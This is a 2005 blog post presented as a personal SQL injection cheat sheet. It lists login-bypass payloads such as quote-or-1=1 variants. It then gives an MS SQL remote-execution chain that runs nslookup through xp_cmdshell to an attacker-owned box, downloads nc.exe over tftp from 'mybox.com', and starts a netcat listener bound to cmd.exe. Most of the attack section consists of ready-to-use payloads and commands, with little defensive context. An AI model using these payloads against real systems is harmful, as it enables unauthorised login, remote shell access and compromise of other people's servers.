---
id: 11
title: SQL Injection Cheat Sheet
date: 2005-11-29T16:57:00+00:00
author: Devin Ertel
layout: post
guid: http://www.infointox.net/?p=11
permalink: /?p=11
blogger_blog:
  - informationintoxication.blogspot.com
blogger_author:
  - Devinhttp://www.blogger.com/profile/15793900111446118223noreply@blogger.com
blogger_permalink:
  - /2005/11/sql-injection-cheat-sheet_29.html
categories:
  - Uncategorized
tags:
  - SQLi
---
A small reference when testing and using SQL Injection.

Note: This is for my reference, so if there is not enough detail I apologize.

**Testing For SQL Injection Vulnerabilities:**

We want to see if the input is sanitized or checked, below is something you can insert into the form to check.

**ba&#8217; or 1=1&#8211;**

Example:
  
User: ba&#8217; or 1=1&#8211;
  
Pass: ba&#8217; or 1=1&#8211;

**Query Manipulation:**

SELECT * FROM table WHERE user=&#8217;ba&#8217;

-TO-

SELECT * FROM table WHERE user=&#8217;ba&#8217; or 1=1&#8211;

Other examples (Depending on how the query was written here are other options to try) :
  
**
  
&#8216; or &#8216;1&#8217;=&#8217;1
  
&#8216; or 1=1&#8211;
  
&#8221; or 1=1&#8211;
  
or 1=1&#8211;
  
&#8216; or &#8216;1&#8217;=&#8217;1
  
&#8221; or &#8220;1&#8221;=&#8221;1
  
&#8216;) or (&#8216;1&#8217;=&#8217;1**

Note:( &#8212; ) Is only needed for MS SQL servers. The ( &#8212; ) will tell the server to ignore the rest of the query sometimes can replace with ( # ). This will make sure your signal quotes ( &#8216; ) are in order. Also, if field is hidden you can run the form from your local box w/ the injection in it.

**Remote Execution on MS SQL:**

Now we know the server is vulnerable, while being nice, the above does not always allow us to bypass the login screen. Or we just may want to do something different. Here is an option.

Start a sniffer on a box you own:

**\# tcpdump udp and port 53 and victimhostname**

Now make the victim do a DNS query against your box:

**’; EXEC master..xp_cmdshell ‘nslookup mybox.com’ &#8212;**

You will see the dns query in your tcpdump output. Which means the EXEC worked! Now you can do whatever you like. For demonstration purposes lets just upload NetCat and execute.

**&#8216;; EXEC master..xp_cmdshell ‘tftp –I mybox.com GET nc.exe c:\nc.exe&#8217; &#8212;**

Now execute netcat so it’s listening.

**&#8216;; EXEC master..xp_cmdshell ‘c:\nc.exe –l –p 9999 –e cmd.exe’ –-**

Now if you know what to do the box is all yours!

Note: The ( ; ) will end the previous query and start the next. Also, if the ( &#8216; ) is not working try a ( &#8221; ).

**Conclusion:** This is very basic SQL injection. Since it is just a cheat sheet I did not want this to become to long. Later I will cover other topics such as info gathering from ODBC error messages, Column gathering, querying specific things, blind SQL injection.

**Other Good Docs:**
  
<http://www.securiteam.com/securityreviews/5DP0N1P76E.html>
  
<http://www.spidynamics.com/whitepapers/WhitepaperSQLInjection.pdf>